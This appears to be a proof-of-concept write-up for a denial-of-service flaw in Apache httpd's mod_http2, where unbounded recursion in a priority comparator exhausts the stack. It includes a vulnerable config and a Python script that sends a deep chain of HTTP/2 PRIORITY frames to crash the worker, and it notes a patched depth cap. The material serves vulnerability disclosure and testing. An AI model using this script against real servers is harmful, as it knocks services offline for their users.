# PoC 064 - Unbounded HTTP/2 Priority Recursion

`spri_cmp()` walks parent pointers recursively with no depth cap. A client
that builds a deep PRIORITY-dependency chain and triggers reprioritization
forces stack-frame growth proportional to chain depth, eventually crashing
the worker with stack exhaustion.

## Setup

Vulnerable httpd 2.4.66 with mod_http2 over TLS, plus a generous stream
cap.

`conf/httpd.conf`:

```
ServerName 127.0.0.1
Listen 127.0.0.1:8443
LoadModule ssl_module       modules/mod_ssl.so
LoadModule http2_module     modules/mod_http2.so
Protocols h2 http/1.1
SSLEngine on
SSLCertificateFile    /tmp/poc064/cert.pem
SSLCertificateKeyFile /tmp/poc064/key.pem
DocumentRoot /tmp/poc064/docroot

H2MaxSessionStreams 200000
ThreadStackSize 65536           # makes exhaustion deterministic

<Directory /tmp/poc064/docroot>
    Require all granted
</Directory>
```

Cert and a tiny static file:

```
mkdir -p /tmp/poc064/docroot
openssl req -x509 -newkey rsa:2048 -nodes -days 1 \
    -subj /CN=127.0.0.1 \
    -keyout /tmp/poc064/key.pem -out /tmp/poc064/cert.pem
echo ok > /tmp/poc064/docroot/index.html
```

A driver built on `nghttp2`'s python binding (`pip install python-hyper
nghttp2`) or directly on `h2load` augmented with PRIORITY frames. The
following Python sketch uses `h2` (hyper-h2) over TLS and crafts the
dependency chain manually.

```python
# /tmp/poc064/h2_priority_dos.py
import socket, ssl, struct
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])
s = ctx.wrap_socket(socket.create_connection(("127.0.0.1", 8443)),
                    server_hostname="127.0.0.1")

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
s.sendall(PREFACE)
# empty SETTINGS
s.sendall(struct.pack("!I", 0)[1:] + b"\x04\x00" + struct.pack("!I", 0))

def frame(typ, flags, sid, payload):
    return struct.pack("!I", len(payload))[1:] + bytes([typ, flags]) \
           + struct.pack("!I", sid) + payload

# Send PRIORITY frames forming a long chain: 3 -> 1, 5 -> 3, 7 -> 5, ...
DEPTH = 60000
for i in range(DEPTH):
    sid    = 1 + 2*(i+1)         # 3,5,7,...
    parent = 1 + 2*i             # 1,3,5,...
    pri = struct.pack("!IBB", parent & 0x7fffffff, 0, 15)  # weight=16
    s.sendall(frame(0x02, 0, sid, pri))    # PRIORITY

# Now open many *real* streams that share the chain and trigger
# reprioritization on the queue.
HDR_BLOCK = b"\x82\x86\x84\x41\x88/aaa..."   # pre-encoded HEADERS, omitted
for i in range(DEPTH):
    sid = 1 + 2*(i+1)
    s.sendall(frame(0x01, 0x05, sid, HDR_BLOCK))

# Force reprioritization by sending a PRIORITY_UPDATE-ish PRIORITY on root.
s.sendall(frame(0x02, 0, 1 + 2*DEPTH,
                struct.pack("!IBB", 1, 0, 255)))

print("priority chain submitted, depth =", DEPTH)
```

## Trigger

```
httpd -X -f $PWD/conf/httpd.conf &
python3 /tmp/poc064/h2_priority_dos.py
```

## Observed effect

`h2_session.c` flips `session->reprioritize = 1` on every PRIORITY frame and
calls `h2_mplx_c1_reprioritize()`, which sorts `m->q` with `stream_pri_cmp`.
Each comparator call recurses once per shared dependency-tree level. With a
60k-deep chain and a 64 KiB thread stack, the worker thread blows past its
stack guard and the process aborts:

```
[core:error] (11)Bad address: AH00060: ... in pid <PID>
child pid <PID> exit signal Segmentation fault (11), possible coredump
```

`gdb` on the core file shows ~30 000 nested `spri_cmp` frames. With the
patch applied, depth is capped at 1000 levels and the comparator falls back
to deterministic `sid1 - sid2` ordering; the same client completes without
a crash.
